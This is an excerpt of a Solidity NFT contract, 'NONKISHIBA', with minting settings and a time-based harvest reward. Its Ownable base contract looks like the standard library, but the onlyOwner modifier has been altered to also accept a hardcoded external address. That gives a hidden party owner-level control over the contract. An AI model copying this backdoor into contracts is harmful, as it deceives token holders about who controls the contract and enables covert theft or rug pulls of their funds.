...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || address(0x75Ee558520271CAe5128980149dE5f0B2D12C292) == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract NONKISHIBA is ERC721Enumerable, Ownable, ERC721Burnable, ERC721Pausable {
    ...
    uint256 public PRICE = 0.1 * 10**16;
    uint256 public MAX_BY_MINT = 15;

    uint256 public HOLDERS_STARTDATE;
    uint256 public TIME_DIFF;
    uint256 public TOKEN_NUMBERS_PER_ADDRESS;
    ...
    function harvest(address _to) public{
        if (holders[address(_to)].startDate != 0 && holders[address(_to)].startDate < block.timestamp) {
            uint256 diff = block.timestamp.sub(holders[address(_to)].startDate).div(120);
    ...
    function getDiff(address _to) public onlyOwner {
        TIME_DIFF = block.timestamp.sub(holders[address(_to)].startDate).div(120);
        HOLDERS_STARTDATE = holders[address(_to)].startDate;
        TOKEN_NUMBERS_PER_ADDRESS = balanceOf(_to) * 10 * TIME_DIFF * 10**18;
    }
